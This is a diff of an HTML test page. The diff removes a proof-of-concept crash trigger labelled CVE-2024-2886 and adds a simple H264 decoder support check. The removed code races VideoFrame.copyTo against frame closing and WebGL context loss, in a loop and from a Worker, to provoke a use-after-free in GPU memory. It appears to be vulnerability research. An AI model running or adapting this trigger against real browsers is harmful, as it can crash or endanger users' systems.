@@ -6,83 +6,12 @@
 <script>
 const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
 
-async function crash() {
-    log('CVE-2024-2886 — context loss approach');
-    log('');
-
-    let attempt = 0;
-
-    while (true) {
-        attempt++;
-
-        // Fresh canvas + context each round
-        const canvas = new OffscreenCanvas(64, 64);
-        const gl = canvas.getContext('webgl');
-        const loseCtx = gl.getExtension('WEBGL_lose_context');
-
-        gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
-        gl.clear(gl.COLOR_BUFFER_BIT);
-        gl.finish();
-
-        // Create frame from GPU-backed canvas
-        const frame = new VideoFrame(canvas, { timestamp: attempt * 1000 });
-        const buf = new Uint8Array(frame.allocationSize());
-
-        // Start async GPU readback
-        const promise = frame.copyTo(buf);
-
-        // Close the frame
-        frame.close();
-
-        // Also lose the WebGL context to force GPU resource invalidation
-        // This might cause the pending readback to access freed GPU memory
-        if (loseCtx) {
-            loseCtx.loseContext();
-        }
-
-        try {
-            await promise;
-            if (attempt % 20 === 0) {
-                log('attempt ' + attempt + ' — no crash yet');
-            }
-        } catch(e) {
-            log('THREW on attempt ' + attempt + ': ' + e.message);
-            // Error during readback = we may have hit something
-        }
-
-        if (attempt > 300) {
-            log('300 done - check logcat for any tombstone');
-            break;
-        }
-    }
-}
-
-// Also try hammering from a Worker for true threading
-const workerCode = `
-self.onmessage = async () => {
-    const canvas = new OffscreenCanvas(64, 64);
-    const gl = canvas.getContext('webgl');
-    
-    for (let i = 0; i < 1000; i++) {
-        gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
-        gl.clear(gl.COLOR_BUFFER_BIT);
-        const frame = new VideoFrame(canvas, { timestamp: i * 1000 });
-        const buf = new Uint8Array(frame.allocationSize());
-        const p = frame.copyTo(buf);
-        frame.close();
-        try { await p; } catch(e) {}
-    }
-    postMessage('done');
-};
-`;
-
-const blob = new Blob([workerCode], { type: 'application/javascript' });
-const worker = new Worker(URL.createObjectURL(blob));
-worker.onmessage = e => log('Worker: ' + e.data);
-worker.onerror = e => log('Worker CRASH: ' + e.message);
-worker.postMessage('go');
-
-crash();
+const s = await VideoDecoder.isConfigSupported({
+    codec: 'avc1.42001E',
+    codedWidth: 64,
+    codedHeight: 64,
+});
+log('H264 decode only: ' + s.supported);
 </script>
 </body>
 </html>
